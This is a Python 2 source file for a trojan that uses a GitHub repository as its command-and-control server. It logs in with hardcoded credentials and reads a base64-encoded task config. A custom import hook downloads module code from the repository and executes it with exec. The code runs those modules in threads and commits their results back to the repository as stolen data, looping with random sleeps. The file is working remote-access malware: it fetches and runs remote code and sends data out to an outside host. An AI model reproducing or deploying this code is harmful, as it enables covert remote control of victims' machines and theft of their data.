import json
import base64
import sys
import time
import imp
import random
import threading
import Queue
import os
from Crypto import Random
from Crypto.Cipher import AES
from Crypto.PublicKey import RSA
from github3 import login

trojan_id = "abc"

trojan_config = "{0}.json".format(trojan_id)
data_path = "data/{0}/".format(trojan_id)
trojan_modules= []
public_key = None
task_queue = Queue.Queue()
configured = False
owner = "bskpp"
repo_name = "trproject"

#Connects to a GitHub account
#Returns: github account, repository and branch steer objects
def connect_to_github():
    gh = login(owner, "testpass2")
    repo = gh.repository(owner, repo_name)
    branch = repo.branch("master")

    return gh, repo, branch

#Reads content from a file in a GitHub repository if it exists
#Returns content of a file (base64 encoded)
def get_file_contents(filepath):
    gh, repo, branch = connect_to_github()
    tree = branch.commit.commit.tree.recurse()

    for filename in tree.tree:
        if filepath in filename.path:
            print "[*] Found file {0}".format(filepath)
            blob = repo.blob(filename._json_data['sha'])
            return blob.content

    return None

#Import modules from trojan configuration file(if it exists) that don't exist in sys.modules.
#If imported module is not found, this triggers GitImporter() a it's added to sys.meta path.
#returns config file as a json object
def get_trojan_config():
    global configured
    config_json = get_file_contents(trojan_config)
    config = json.loads(base64.b64decode(config_json))
    configured = True

    for task in config:
        if task['module'] not in sys.modules:
            exec("import {0}".format(task['module']))

    return config

#Saves the data obtained from module execution in a repository as a commit
def store_module_result(info, data):
    gh, repo, branch = connect_to_github()
    remote_path = data_path + "{0}.data".format(info)
    repo.create_file(remote_path, "Data fetched - {0}".format(info), data)

#Executes code from a given module and publish it's result to a remote Git repository.
def module_runner(module):
        task_queue.put(1)
        info, result = sys.modules[module].run()
        task_queue.get()

        store_module_result(info, result)
        return

#custom class extending default Python import process. If import statement is not found in sys.modules it will search for
#custom importers defined in sys.meta_path. This importer downloads modules from Git repository and then adds it to sys.modules
class GitImporter(object):

    def __init__(self):
        self.current_module_code = ""

    def find_module(self, fullname, path=None):
        if configured:
            print "[*] Trying to download {0}..".format(fullname)
            new_library = get_file_contents(fullname)

            if new_library is not None:
                self.current_module_code = base64.b64decode(new_library)
                return self

        return None

    def load_module(self, name):
        module = imp.new_module(name)
        exec self.current_module_code in module.__dict__
        sys.modules[name] = module

        return module

#execution start
sys.meta_path = [GitImporter()]

#main loop for a trojan
while True:
    if(task_queue.empty()):

        config = get_trojan_config()

        for task in config:
            t = threading.Thread(target=module_runner,args=(task['module'],))
            t.start()
            time.sleep(random.randint(1, 10))

    time.sleep(random.randint(60, 120))






















